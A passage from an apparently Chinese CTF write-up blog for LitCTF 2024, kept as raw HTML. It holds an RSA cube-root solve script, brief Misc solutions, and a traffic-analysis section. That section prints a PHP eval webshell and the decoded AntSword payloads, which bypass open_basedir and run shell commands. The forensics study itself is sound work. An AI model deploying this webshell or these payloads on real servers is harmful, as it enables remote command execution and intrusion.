class="token number">592704</span><span class="token punctuation">,</span> <span class="token number">343000</span><span class="token punctuation">,</span> <span class="token number">1860867</span><span class="token punctuation">,</span> <span class="token number">1771561</span><span class="token punctuation">,</span>    <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1225043</span><span class="token punctuation">,</span> <span class="token number">1331000</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1685159</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span>    <span class="token number">1295029</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1030301</span><span class="token punctuation">,</span> <span class="token number">1442897</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">140608</span><span class="token punctuation">,</span> <span class="token number">1259712</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span>    <span class="token number">970299</span><span class="token punctuation">,</span> <span class="token number">1601613</span><span class="token punctuation">,</span> <span class="token number">941192</span><span class="token punctuation">,</span> <span class="token number">132651</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1481544</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span> <span class="token number">1367631</span><span class="token punctuation">,</span>    <span class="token number">1560896</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">110592</span><span class="token punctuation">,</span> <span class="token number">1061208</span><span class="token punctuation">,</span> <span class="token number">857375</span><span class="token punctuation">,</span> <span class="token number">1331000</span><span class="token punctuation">,</span> <span class="token number">1953125</span><span class="token punctuation">]</span>k <span class="token operator">=</span> <span class="token number">0</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> c_list<span class="token punctuation">:</span>    t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>i<span class="token punctuation">,</span> e<span class="token punctuation">)</span>    <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token builtin">bytes</span> <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        dec_str <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        res <span class="token operator">+=</span> dec_str        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>k <span class="token operator">*</span> n <span class="token operator">+</span> i<span class="token punctuation">,</span> e<span class="token punctuation">)</span>            <span class="token keyword">if</span> m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                k <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>LitCTF&#123;you_know_m_equ4l_cub3_root_0f_n&#125;</code></p><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><p>stegsolve改通道秒了</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601151626047.png" alt="image-20240601151626047"></p><hr><h2 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h2><p>puzzlesolver秒了</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601161036897.png" alt="image-20240601161036897"></p><hr><h2 id="女装照流量"><a href="#女装照流量" class="headerlink" title="女装照流量"></a>女装照流量</h2><p>在最后一次http访问的流量中提取出一个zip文件</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601160010559.png" alt="image-20240601160010559"></p><p>010导入，然后得到flag.zip，其中有flag.php，但是需要密码</p><p>跟踪到&#x2F;upload.php上传ma.php的步骤</p><p><img src="/blog/2024/06/01/LitCTF2024/image-20240601154418077.png" alt="image-20240601154418077"></p><p>ma.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'LitCtF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>跟踪下一步操作：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">LitCtF<span class="token operator">=</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$opdir</span><span class="token operator">=</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$opdir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$ocwd</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$oparr</span><span class="token operator">=</span><span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|:/"</span><span class="token punctuation">,</span><span class="token variable">$opdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$oparr</span><span class="token punctuation">,</span><span class="token variable">$ocwd</span><span class="token punctuation">,</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$oparr</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$tmdir</span><span class="token operator">=</span><span class="token variable">$item</span><span class="token operator">.</span><span class="token string double-quoted-string">"/.e4831d8"</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cntarr</span><span class="token operator">=</span>@<span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\//"</span><span class="token punctuation">,</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$cntarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$output</span><span class="token operator">=</span><span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"56"</span><span class="token operator">.</span><span class="token string double-quoted-string">"6f2"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"37f3c"</span><span class="token operator">.</span><span class="token string double-quoted-string">"b0dcda"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$D</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token operator">==</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token variable">$D</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"PATH_TRANSLATED"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span><span class="token operator">=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$D</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"Z"</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token variable">$L</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$R</span><span class="token operator">.=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$L</span><span class="token punctuation">&#125;</span></span>:"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$R</span><span class="token operator">.=</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$R</span><span class="token operator">.=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"posix_getegid"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>@<span class="token function">posix_getpwuid</span><span class="token punctuation">(</span>@<span class="token function">posix_geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$u</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>@<span class="token function">get_current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span><span class="token operator">.=</span><span class="token function">php_uname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$R</span><span class="token operator">.=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$R</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"ERROR://"</span><span class="token operator">.</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜了一下发现是蚁剑的流量，逻辑是每个参数传入的值都去掉前两位再进行base64解密，直接跟到创建flag.zip前的操作</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">LitCtF<span class="token operator">=</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$opdir</span><span class="token operator">=</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$opdir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$ocwd</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$oparr</span><span class="token operator">=</span><span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|:/"</span><span class="token punctuation">,</span><span class="token variable">$opdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$oparr</span><span class="token punctuation">,</span><span class="token variable">$ocwd</span><span class="token punctuation">,</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$oparr</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">is_writable</span><span class="token punctuation">(</span><span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token variable">$tmdir</span><span class="token operator">=</span><span class="token variable">$item</span><span class="token operator">.</span><span class="token string double-quoted-string">"/.a51d841"</span><span class="token punctuation">;</span>@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cntarr</span><span class="token operator">=</span>@<span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\//"</span><span class="token punctuation">,</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$cntarr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>@<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$tmdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asenc</span><span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">asoutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$output</span><span class="token operator">=</span><span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"e8a2"</span><span class="token operator">.</span><span class="token string double-quoted-string">"4a4a0"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> @<span class="token function">asenc</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"7336e"</span><span class="token operator">.</span><span class="token string double-quoted-string">"3afe3a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"da8af99c22690c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"j6d5aaa1b7e5ac"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$envstr</span><span class="token operator">=</span>@<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xf65aaf1672c18"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"SCRIPT_FILENAME"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"/"</span><span class="token operator">?</span><span class="token string double-quoted-string">"-c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"/c \"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$s</span><span class="token punctuation">&#125;</span></span>\""</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span><span class="token operator">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>@<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH="</span><span class="token operator">.</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PATH"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$envarr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||asline|||"</span><span class="token punctuation">,</span> <span class="token variable">$envstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$envarr</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">putenv</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|||askey|||"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"="</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$r</span><span class="token operator">=</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$p</span><span class="token punctuation">&#125;</span></span> <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$c</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">fe</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span>@<span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'trim'</span><span class="token punctuation">,</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'strtolower'</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span><span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">runshellshock</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token 